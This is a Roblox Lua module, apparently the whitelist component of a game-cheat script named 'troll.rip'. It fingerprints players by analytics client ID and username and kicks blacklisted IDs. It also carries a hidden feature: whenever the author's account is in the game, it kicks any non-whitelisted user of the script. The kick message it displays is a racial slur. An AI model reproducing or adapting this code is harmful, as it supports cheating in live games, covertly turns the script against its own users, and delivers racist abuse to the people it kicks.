--[[
    troll.rip 1.0.0
    Type: Whitelist

    by: @stav
    Meant to be a one person whitelist, so sorry not sorry :)
]]

local cloneref = cloneref or function(obj)
    return obj
end

local analyticsService = cloneref(game:GetService('RbxAnalyticsService'))
local playersService = cloneref(game:GetService('Players'))

local lplr = playersService.LocalPlayer
local wl = {
    data = {
        WhitelistedUsers = {
            stav = {
                User = 'retygh5rtyhg',
                ClientId = '0436570C-16F7-447D-9366-8FDE5BFCEB9A',
                Features = {
                    kickusersonjoin = {
                        Enabled = true,
                        Reason = 'cotton picker'
                    }
                }
            }
        },
        BlacklistedUsers = {}
    },
    checked = false,
    SelfDestruct = false,
    level = 0
}

for i,v in wl.data.WhitelistedUsers do
    if i == 'stav' and v.ClientId == analyticsService:GetClientId() and v.User == lplr.Name then
        wl.level = 2
        print(wl.level)
    elseif v.ClientId == analyticsService:GetClientId() and v.User == lplr.Name then
        wl.level = 1
    end
end

function wl:check()
    if wl.checked then return end
    wl.checked = true

    for i,v in wl.data.WhitelistedUsers do
        if i == 'stav' and v.ClientId == analyticsService:GetClientId() then
            wl.level = 2
            print(wl.level)
        elseif v.ClientId == analyticsService:GetClientId() then
            wl.level = 1
        end
    end
end

function wl:get(): any
    return self.level
end

for i,v in wl.data.BlacklistedUsers do
    if i == analyticsService:GetClientId() then
        lplr:Kick(v.Reason)
        wl.SelfDestruct = true

        return
    end
end

function wl:ingame()
    for i,v in playersService:GetPlayers() do
        if v.Name == self.data.WhitelistedUsers.stav.User then
            return true
        end
    end

    return false
end

for i,v in wl.data.WhitelistedUsers do
    if v.Features.kickusersonjoin.Enabled == true and wl:ingame() then
        if wl.level <= 1 then
            lplr:Kick(v.Features.kickusersonjoin.Reason)
        end
    end
end

return wl